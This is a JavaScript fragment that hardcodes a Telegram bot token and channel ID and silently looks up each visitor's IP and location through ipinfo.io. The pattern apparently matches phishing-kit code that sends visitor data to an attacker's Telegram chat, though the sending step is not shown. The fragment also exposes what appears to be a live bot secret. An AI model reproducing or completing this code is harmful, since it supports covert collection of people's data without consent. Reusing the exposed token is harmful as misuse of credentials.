
var TelegramBot = "7818427676:AAET71rXWr5dYEWj-dfWTzZuB7v33Ihyf8k";
var TelegramChannel = "-4659175856";
var ipData = getIP();

function getIP(){
    var ip = '';
    $.ajax({
        url:'https://ipinfo.io/json',
        method:'GET',
        async:false,
        success:function(data){
            ip = data;
        }
    });
    return ip;
}